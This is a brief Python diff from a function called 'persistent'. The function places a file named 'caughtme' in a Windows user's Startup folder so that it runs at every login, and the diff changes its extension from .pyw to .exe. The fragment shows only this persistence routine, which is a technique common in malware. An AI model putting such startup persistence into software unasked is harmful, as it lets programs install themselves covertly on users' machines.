@@ -5,7 +5,7 @@ import shutil
 def persistent():
     try:
         filepath = r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ '
-        actual_filepath = os.path.join(r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ ', 'caughtme.pyw')
+        actual_filepath = os.path.join(r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ ', 'caughtme.exe')
         if os.path.exists(actual_filepath):
             return
         else: 
